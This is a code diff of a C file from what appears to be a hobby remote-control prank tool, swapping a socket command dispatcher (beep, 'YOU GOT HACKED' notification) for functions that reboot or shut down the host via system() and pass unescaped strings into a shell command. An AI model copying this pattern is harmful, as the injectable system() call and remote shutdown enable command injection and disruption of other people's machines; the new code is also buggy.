@@ -39,55 +39,23 @@
 #include <server/listener.h>
 #include <exploits/help.h>
 
-typedef struct {
-    const char *name;
-    int (*command)();
-} CommandsHandlerMap;
+char logs[1024];
 
-int systemBeep() {
-    printf("\a");
-    return 0;
+void lb_reboot()
+{
+    system("reboot");
 }
 
-int runShell() {
-    system("gnome-terminal -- curl wttr.in");
-    return 0;
+void lb_shutdown() {
+    system("shutdown -r now");
 }
 
-int sendNotify() {
-    system("notify-send 'YOU GOT HACKED AJAJAJAJAJJ'");
-    return 0;
-}
+void lb_notify(char *notifyTitle, char *notifyDescription) {
+    char *notifyCommand = "";
 
-int test(int connfd) {
-    char test_buff[1024] = "Test Successfully Ended";
+            printf("2");
+    sprintf(notifyCommand, "notify-send \"%s\" \"%s\" ", notifyTitle, notifyDescription);
 
-    
-    write(connfd, test_buff, strlen(test_buff));
-
-    return 0;
-}
-
-
-CommandsHandlerMap commandsMap[] = {
-    {"beep", systemBeep},
-    {"runshell", runShell},
-    {"notify", sendNotify},
-    {"help", helpCommand},
-    {NULL, NULL}
-};
-
-void parseCommand(const char *command, int connfd) {
-    for (int i = 0; commandsMap[i].name != NULL; i++) {
-        if (strcmp(commandsMap[i].name, command) == 0) {
-            commandsMap[i].command();
-            return;
-        }
-    }
-
-    if(strcmp("test", command) == 0) {
-        test(connfd);
-        return;
-    }
-    printf("Cannot find command: %s\n", command);
+            printf("3");
+    system(notifyCommand);
 }
